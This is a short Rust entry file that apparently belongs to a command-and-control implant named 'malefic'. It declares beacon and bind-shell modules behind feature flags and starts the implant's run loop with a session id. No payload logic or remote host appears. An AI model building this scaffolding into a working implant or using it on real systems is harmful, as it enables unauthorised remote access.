mod malefic;
mod stub;
mod meta;

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;

use crate::malefic::Malefic;

#[no_mangle]
pub extern fn main() {
use async_std::task;
   let _ = task::block_on(async {
       Malefic::run(malefic_proto::get_sid()).await
   });
}